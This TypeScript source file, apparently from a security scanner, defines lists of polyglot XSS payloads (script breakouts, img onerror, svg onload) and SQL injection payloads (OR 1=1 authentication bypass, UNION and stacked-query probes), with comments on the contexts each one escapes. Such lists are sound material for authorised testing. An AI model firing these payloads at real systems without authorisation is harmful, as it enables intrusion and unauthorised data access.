/**
 * Polyglot payloads — single payloads that work in multiple injection contexts.
 * These are designed for authorized security testing only.
 *
 * XSS polyglots work across HTML attribute, JS string, and URL contexts.
 * SQLi polyglots work across different SQL quoting/grouping contexts.
 */

/**
 * Polyglot XSS payloads that trigger across multiple HTML/JS contexts:
 * - HTML body (unquoted text)
 * - HTML attribute values (single/double quoted)
 * - JavaScript string literals
 * - URL/href contexts
 */
const POLYGLOT_XSS: readonly string[] = [
  // Breaks out of JS comments, template literals, strings, and HTML attributes
  `jaVasCript:/*-/*\`/*\\/*'/*"/**/(/* */oNcliCk=alert() )//`,
  // Breaks out of both single and double quoted attributes, injects img tag
  `'"><img src=x onerror=alert(1)//`,
  // Breaks out of attributes, injects SVG with onload
  `"><svg/onload=alert(1)>`,
  // Works in href/src attributes and as standalone HTML
  `javascript:alert(1)//'//"--></script></title></textarea>`,
  // Breaks out of style/script/textarea/title contexts
  `</script></title></textarea><img src=x onerror=alert(1)>`,
  // Event handler injection — works in many attribute contexts
  `" autofocus onfocus=alert(1) x="`,
  // Breaks out of JS string context with both quote types
  `'-alert(1)-'`,
  // SVG-based — bypasses some tag-name filters
  `<svg><script>alert(1)</script></svg>`,
  // Data URI polyglot for src/href contexts
  `data:text/html,<script>alert(1)</script>`,
  // Template literal breakout for modern JS contexts
  `\${alert(1)}`,
] as const;

/**
 * Polyglot SQLi payloads that work across different SQL quoting and grouping contexts:
 * - Single-quoted string
 * - Double-quoted identifier
 * - Parenthesized expressions
 * - Numeric context (no quotes)
 */
const POLYGLOT_SQLI: readonly string[] = [
  // Classic OR-based auth bypass — single-quoted string context
  `' OR '1'='1' --`,
  // AND-based probe — single-quoted string, verifies injection
  `1' AND '1'='1`,
  // Breaks out of parenthesized WHERE clause
  `') OR ('1'='1`,
  // Works in both string and numeric contexts
  `' OR 1=1--`,
  // Double-quote context (MySQL identifiers, some string contexts)
  `" OR "1"="1" --`,
  // Breaks out of nested parentheses
  `')) OR (('1'='1`,
  // Numeric context — no quotes needed
  `1 OR 1=1--`,
  // UNION-based probe with comment termination
  `' UNION SELECT NULL--`,
  // Stacked query probe (works on MSSQL, PostgreSQL)
  `'; SELECT 1--`,
  // MySQL-specific comment syntax as backup terminator
  `' OR '1'='1' #`,
] as const;

/**
 * Get all polyglot XSS payloads.
 * These payloads are designed to work in multiple HTML/JS injection contexts simultaneously.
 */
export function getPolyglotXss(): string[] {
  return [...POLYGLOT_XSS];
}

/**
 * Get all polyglot SQLi payloads.
 * These payloads are designed to work in multiple SQL injection contexts simultaneously.
 */
export function getPolyglotSqli(): string[] {
  return [...POLYGLOT_SQLI];
}
